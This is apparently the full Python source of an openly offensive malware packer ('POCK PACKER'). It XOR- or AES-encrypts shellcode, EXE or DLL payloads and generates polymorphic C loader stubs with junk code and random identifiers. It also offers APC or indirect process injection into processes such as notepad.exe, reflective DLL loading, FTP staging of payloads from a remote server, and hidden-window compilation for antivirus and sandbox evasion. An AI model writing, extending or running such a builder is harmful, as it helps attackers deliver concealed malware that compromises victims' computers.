import argparse
import os
import subprocess
import random
import string
from urllib.parse import urlparse
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad


def ascii():
    art = r"""
  ____   ___   ____ _  __
 |  _ \ / _ \ / ___| |/ /
 | |_) | | | | |   | ' / 
 |  __/| |_| | |___| . \ 
 |_|    \___/ \____|_|\_\
 
        *PACKER*
 
 “UnPACKable payloads start here!”
 By wcrooker                                  v1.2
"""
    print(art)

def xor_encrypt(data, key):
    key_bytes = key.encode()
    return bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)])

def aes_encrypt(data, key):
    key_bytes = key.encode()
    key_bytes = key_bytes.ljust(16, b'\0')[:16]
    cipher = AES.new(key_bytes, AES.MODE_CBC, iv=b'\0'*16)
    return cipher.encrypt(pad(data, 16))

def random_identifier(length=8):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def generate_stub(payload_bytes, key, enc_algo, payload_type, url=None, embed_payload=True, ftp_user="anonymous", ftp_pass="", inject_method="apc", target_process=None):
    if embed_payload:
        payload_array = ','.join(f'0x{b:02x}' for b in payload_bytes)
        payload_len = len(payload_bytes)
    else:
        payload_array = ''
        payload_len = 0

    with open("stub_template.c", "r") as f:
        stub_code = f.read()

    buf_name = random_identifier()
    size_name = random_identifier()
    capacity_name = random_identifier()
    junk_func = random_identifier()
    junk_var = random_identifier()

    stub_code = stub_code.replace("{{BUF_NAME}}", buf_name)
    stub_code = stub_code.replace("{{SIZE_NAME}}", size_name)
    stub_code = stub_code.replace("{{CAPACITY_NAME}}", capacity_name)

    junk_code = f"""
int {junk_func}() {{
    int {junk_var} = 0;
    for (int i = 0; i < 100; i++) {{
        {junk_var} += i;
    }}
    return {junk_var};
}}
"""
    stub_code = stub_code.replace("// {{JUNK}}", junk_code)

    stub_code = stub_code.replace("{{PAYLOAD_ARRAY}}", payload_array)
    stub_code = stub_code.replace("{{PAYLOAD_SIZE}}", str(payload_len))
    stub_code = stub_code.replace("{{KEY}}", f'"{key}"')
    stub_code = stub_code.replace("{{ENC_ALGO}}", f'"{enc_algo}"')
    stub_code = stub_code.replace("{{PAYLOAD_TYPE}}", f'"{payload_type}"')
    stub_code = stub_code.replace("{{FTP_USER}}", ftp_user)
    stub_code = stub_code.replace("{{FTP_PASS}}", ftp_pass)

    if url:
        parsed_url = urlparse(url)
        ip = parsed_url.hostname
        path = parsed_url.path.lstrip('/')
        port = parsed_url.port or 21
        stub_code = stub_code.replace("{{IP}}", ip)
        stub_code = stub_code.replace("{{PORT}}", str(port))
        stub_code = stub_code.replace("{{PATH}}", path)
    else:
        stub_code = stub_code.replace("{{IP}}", "")
        stub_code = stub_code.replace("{{PORT}}", "0")
        stub_code = stub_code.replace("{{PATH}}", "")

    # Injection method specific replacements
    if inject_method == "indirect":
        stub_code = stub_code.replace("{{INJECT_METHOD_CALL}}", "IndirectInject(buf, len);")
        stub_code = "#define USE_INDIRECT\n" + stub_code
        process_name = target_process if target_process else "notepad.exe"
        stub_code = stub_code.replace("{{PROCESS}}", process_name)
    else:
        stub_code = stub_code.replace("{{INJECT_METHOD_CALL}}", "inject_APC(buf, len);")

    os.makedirs("build", exist_ok=True)
    with open("build/stub.c", "w") as f:
        f.write(stub_code)

def compile_stub(output_name, hide=False, inject_method=None, payload_type=None):
    cmd = [
        "x86_64-w64-mingw32-gcc",
        "-m64", "-Os",
        # ensure the compiler can find ReflectiveLoader.h & GetReflectiveLoaderOffset.h
        "-Iindirect_injection",
        "-DDEBUG",
        "build/stub.c",
        "indirect_injection/GetReflectiveLoaderOffset.c",
        "-o", output_name,
        "-lwininet", "-lpsapi", "-lbcrypt"
    ]
    if hide:
        cmd.append("-mwindows")

    if inject_method == "indirect":
        cmd.extend([
            "indirect_injection/indirect.c",
            # we already have -Iindirect_injection above
        ])

    # for DLLs, compile in the ReflectiveLoader implementation
    if payload_type == "dll":
        cmd.append("indirect_injection/ReflectiveLoader.c")

    print(f"[+] Compiling stub: {' '.join(cmd)}")
    subprocess.run(cmd, check=True)

    # (you can remove the old `if inject_method == "dll":` branch)

    print(f"[+] Compiling stub: {' '.join(cmd)}")
    subprocess.run(cmd, check=True)

def main():
    parser = argparse.ArgumentParser(description="Polymorphic hardened AES/XOR packer with sandbox evasion and FTP staging + auth")
    parser.add_argument("-i", "--input", required=True, help="Input file (exe or shellcode)")
    parser.add_argument("-o", "--output", required=True, help="Output packed executable")
    parser.add_argument("-t", "--type", required=True, choices=["shellcode", "exe", "dll"], help="Payload type")
    parser.add_argument("-e", "--encrypt", required=True, choices=["xor", "aes"], help="Encryption algorithm")
    parser.add_argument("-k", "--key", required=True, help="Encryption key")
    parser.add_argument("--url", help="Optional remote URL for staged payload (ftp:// preferred)")
    parser.add_argument("--bin", help="Output file for external payload (default payload.bin if --url used)")
    parser.add_argument("--ftp-user", default="anonymous", help="FTP username")
    parser.add_argument("--ftp-pass", default="", help="FTP password")
    parser.add_argument("--hide", action="store_true", help="Compile stub with -mwindows for hidden execution")
    parser.add_argument("--inject", choices=["apc", "indirect"], default="apc", help="Injection method")
    parser.add_argument("--target-process", help="Target process name for indirect injection (e.g., notepad.exe)")
    args = parser.parse_args()

    print(f"[+] Loading input file: {args.input}")
    with open(args.input, "rb") as f:
        data = f.read()

    print(f"[+] Input size: {len(data)} bytes")
    print(f"[+] Using encryption: {args.encrypt.upper()}")
    print(f"[+] Payload type: {args.type}")
    print(f"[+] Injection method: {args.inject}")

    if args.encrypt == "xor":
        encrypted = xor_encrypt(data, args.key)
    else:
        encrypted = aes_encrypt(data, args.key)

    if args.url:
        bin_output = args.bin if args.bin else "payload.bin"
        with open(bin_output, "wb") as f:
            f.write(encrypted)
            print(f"[+] Writing encrypted payload to external file: {bin_output}")
            print(f"[+] Staging details:")
            print(f"[+] URL: {args.url}")
            print(f"[+] FTP user: {args.ftp_user}")

        generate_stub(
            encrypted, 
            args.key, 
            args.encrypt, 
            args.type, 
            url=args.url, 
            embed_payload=False, 
            ftp_user=args.ftp_user, 
            ftp_pass=args.ftp_pass, 
            inject_method=args.inject, 
            target_process=args.target_process
        )
    else:
        print("[+] Embedding payload directly into stub")
        generate_stub(
            encrypted, 
            args.key, 
            args.encrypt, 
            args.type, 
            embed_payload=True, 
            ftp_user=args.ftp_user, 
            ftp_pass=args.ftp_pass, 
            inject_method=args.inject, 
            target_process=args.target_process
        )

    print(f"[+] Preparing to compile stub: {args.output}")
    compile_mode = "Hidden (-mwindows)" if args.hide else "Console (-mconsole)"
    print(f"[+] Compile mode: {compile_mode}")
    compile_stub(
        args.output,
        hide=args.hide,
        inject_method=args.inject,
        payload_type=args.type
    )
    print(f"[✓] Packing complete: {args.output}")

if __name__ == "__main__":
    ascii()
    main()
